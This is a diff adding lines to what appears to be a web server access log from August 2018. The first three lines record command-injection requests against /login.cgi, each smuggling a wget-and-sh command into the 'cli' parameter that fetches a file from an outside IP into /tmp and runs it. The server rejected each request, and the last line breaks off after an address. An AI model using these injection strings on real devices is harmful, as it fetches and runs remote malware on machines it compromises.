@@ -1,0 +1,4 @@
+5.150.131.172 - - [21/Aug/2018:02:36:07 -0400] "GET /login.cgi?cli=aa%20aa%27;wget%20http://209.141.33.86/d%20-O%20-%3E%20/tmp/.shinka;sh%20/tmp/.shinka%27$ HTTP/1.1" 400 -
+156.221.24.192 - - [21/Aug/2018:02:44:52 -0400] "GET /login.cgi?cli=aa%20aa%27;wget%20http://50.115.166.136/bin%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 400 -
+156.209.19.198 - - [21/Aug/2018:02:48:27 -0400] "GET /login.cgi?cli=aa%20aa%27;wget%20http://176.32.32.156/bin%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 400 -
+168.1.128.54
